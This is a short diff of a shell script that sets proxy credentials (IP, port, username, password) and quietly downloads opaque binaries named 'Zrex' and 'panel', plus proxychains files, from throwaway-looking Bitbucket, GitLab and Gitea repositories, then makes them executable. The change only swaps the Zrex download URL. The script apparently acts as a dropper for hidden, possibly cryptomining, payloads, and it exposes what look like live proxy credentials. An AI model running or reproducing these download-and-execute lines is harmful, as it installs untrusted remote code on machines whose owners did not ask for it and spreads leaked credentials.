@@ -2,7 +2,7 @@ proxy="52.5.38.201"
 port="9293" 
 user="py8h6mtimyeool"  
 pass="r1wr4kibq49lw0k52qhi17h0ke1j" 
-wget -q -O xza https://bitbucket.org/mandaresz/feriyaz/downloads/Zrex && chmod +x xza
+wget -q -O xza https://gitlab.com/daserax/revan/-/raw/main/Zrex && chmod +x xza
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
